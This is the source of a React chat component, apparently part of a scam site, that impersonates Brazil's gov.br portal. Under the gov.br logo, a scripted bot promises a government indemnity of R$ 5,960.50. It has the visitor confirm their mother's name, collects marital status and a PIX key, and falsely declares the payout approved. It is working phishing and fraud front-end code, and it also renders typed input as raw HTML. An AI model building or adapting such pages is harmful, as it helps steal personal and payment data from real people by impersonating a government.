import React, { useEffect, useState } from 'react';
import styles from './Chat.module.scss';

const Chat = () => {
  const [step, setStep] = useState(0);
  const [isTyping, setIsTyping] = useState(false);
  const [messages, setMessages] = useState([]);
  const [nomeCompleto, setNomeCompleto] = useState('');
  const [nomeDaMae, setNomeDaMae] = useState('');
  const [options, setOptions] = useState([]);
  const [chavePix, setChavePix] = useState('');
  const [audio] = useState(new Audio('/a1.mp3'));
  const [inputPix, setInputPix] = useState(''); // para armazenar a chave PIX digitada
  const [showPixInput, setShowPixInput] = useState(false); // controla exibição do input PIX

  // Carregar dados do localStorage uma vez
  useEffect(() => {
    const nome = localStorage.getItem('nomeCompleto') || '';
    const mae = localStorage.getItem('nomeDaMae') || '';
    setNomeCompleto(nome);
    setNomeDaMae(mae);
  }, []);

  // Função para adicionar mensagem no chat
  const addMessage = (from, text) => {
    setMessages(prev => [...prev, { id: prev.length, from, text }]);
  };

  // Bot "fala" conforme step, exceto nas etapas com interação
  useEffect(() => {
    const delay = 3200;
    const passosComInteracao = [5, 6, 7, 10];

    if (step > 11) return;

    setIsTyping(true);

    const timer = setTimeout(() => {
      if (passosComInteracao.includes(step)) {
        // Mensagens para passos 6 e 7 para aparecer antes das opções
        if (step === 6 || step === 7) {
          botFala(step);
        }

        setIsTyping(false);

        if (step === 5) {
          const fakeNames = ['Maria', 'Ana', 'Juliana'];
          const allOptions = [...fakeNames];
          const insertIndex = Math.floor(Math.random() * (fakeNames.length + 1));
          allOptions.splice(insertIndex, 0, nomeDaMae.split(' ')[0]);
          setOptions(allOptions);
        } else if (step === 6) {
          setOptions(['Sim', 'Não']);
        } else if (step === 7) {
          setOptions(['Solteiro (a)', 'Casado (a)', 'Divorciado (a)', 'Viúvo (a)']);
        } else if (step === 10) {
          setOptions(['Telefone', 'CPF', 'Email']);
        }
         else if (step === 11) {
          audio.play();
        }
      } else {
        botFala(step);
        setStep(s => s + 1);
        setIsTyping(false);
      }
    }, delay);

    return () => clearTimeout(timer);
  }, [step, nomeDaMae, audio]);

  // Mensagens do bot por step
  const botFala = (stepAtual) => {
    switch (stepAtual) {
      case 0:
        addMessage('bot', '<b>Seja bem-vindo(a)!</b>');
        break;
      case 1:
        addMessage('bot', 'Nos próximos passos vou te auxiliar a receber sua indenização.');
        break;
      case 2:
        addMessage('bot', 'Nos últimos dias, milhares de brasileiros conseguiram sacar essa indenização do governo.');
        break;
      case 3:
        addMessage('bot', 'Responda às perguntas a seguir para aprovação do seu saque de <b>R$ 5.960,50</b>.');
        break;
      case 4:
        addMessage('bot', 'Por favor, confirme o nome de sua mãe:');
        break;
      case 6:
        addMessage('bot', 'Você já instalou ou acessou o GOV no seu celular?');
        break;
      case 7:
        addMessage('bot', 'Qual seu estado civil?');
        break;
      case 8:
        addMessage('bot', 'Obrigado! Suas informações foram verificadas com sucesso.');
        break;
      case 9:
        addMessage('bot', 'Prossiga inserindo sua chave PIX para concluir seu recebimento gerando seu comprovante.');
        addMessage('bot', 'Selecione a chave PIX que deseja usar:');
        break;
      case 11:
        addMessage('bot', 'Aguarde alguns segundos, estamos cadastrando sua chave PIX no sistema...');
        setTimeout(() => {
          addMessage('bot', '<i>Sua chave PIX foi cadastrada com sucesso!</i>');
          addMessage('bot', `Nome: ${nomeCompleto}`);
          addMessage('bot', `Chave PIX: ${chavePix}`);
          addMessage('bot', 'Status: Aprovado');
          addMessage('bot', 'Clique no botão abaixo para confirmar e liberar o envio da sua indenização para a chave PIX informada.');
        }, 1500);
        break;
      default:
        break;
    }
  };

  // Quando usuário clica numa opção
  const handleSelect = (answer) => {
    addMessage('user', answer);
    setOptions([]);

    if (step === 5) {
      if (answer === nomeDaMae.split(' ')[0]) {
        setStep(6);
      } else {
        alert('Nome incorreto. Tente novamente.');
      }
    } else if (step === 6) {
      setStep(7);
    } else if (step === 7) {
      setStep(8);
    } else if (step === 10) {
      setChavePix(answer);
      setShowPixInput(true); // mostrar input para o usuário digitar a chave PIX
      setStep(10.5); // passo intermediário para input PIX
    }
  };

  // Confirmar chave PIX digitada
  const handlePixInputConfirm = () => {
    if (!inputPix.trim()) {
      alert('Por favor, insira sua chave PIX.');
      return;
    }
    addMessage('user', inputPix.trim());
    setShowPixInput(false);
    setStep(11);
  };

  const confirmarEnvio = () => {
    alert('Indenização liberada para envio!');
  };

  return (
    <div className={styles.chat}>
      {/* Navbar */}
      <div className={styles.navbar}>
        <div>
          <img src="/govbr.png" alt="Logo GovBR" />
        </div>
        <div>
          <i className="bi bi-three-dots-vertical"></i>
          <i className="bi bi-circle-half"></i>
          <i className="bi bi-grid-3x3-gap-fill"></i>
          <span className={styles.entrarBtn}>
            {nomeCompleto ? nomeCompleto.split(' ')[0] : ''}
          </span>
        </div>
      </div>

      {/* Caminho */}
      <div className={styles.path}>
        <i className="bi bi-list"></i>
        <span>Benefício &gt; Indenização &gt; <b>Acessar</b></span>
      </div>

      {/* Chat */}
      <div className={styles.chatt}>
        {messages.map(({ id, from, text }) => (
          <div
            key={id}
            className={from === 'bot' ? styles.botMessage : styles.userMessage}
          >
            {from === 'bot' && (
              <img
                src="/govbr.png"
                alt="Logo GovBR"
                className={styles.botImage}
              />
            )}
            <p dangerouslySetInnerHTML={{ __html: text }}></p>
          </div>
        ))}


        {isTyping && (
          <div className={styles.botMessage}>
            <img
              src="/govbr.png"
              alt="Logo GovBR"
              className={styles.botImage}
            />
            <p className={styles.typing}>
              <span></span><span></span><span></span>
            </p>
          </div>
        )}


        {/* Opções para interação */}
        {options.length > 0 && !isTyping && (
          <div className={styles.options}>
            {options.map((opt, i) => (
              <button key={i} onClick={() => handleSelect(opt)}>
                {opt}
              </button>
            ))}
          </div>
        )}

        {/* Input para chave PIX */}
        {showPixInput && !isTyping && (
          <div className={styles.pixInputContainer}>
            <input
              type="text"
              placeholder={`Digite sua chave PIX (${chavePix})`}
              value={inputPix}
              onChange={e => setInputPix(e.target.value)}
            />
            <button onClick={handlePixInputConfirm}>Confirmar</button>
          </div>
        )}

        {/* Botão de confirmação na última etapa */}
        {step === 11 && !isTyping && (
          <div className={styles.actionButton}>
            <button onClick={confirmarEnvio}>Confirmar Envio</button>
          </div>
        )}
      </div>
    </div>
  );
};

export default Chat;
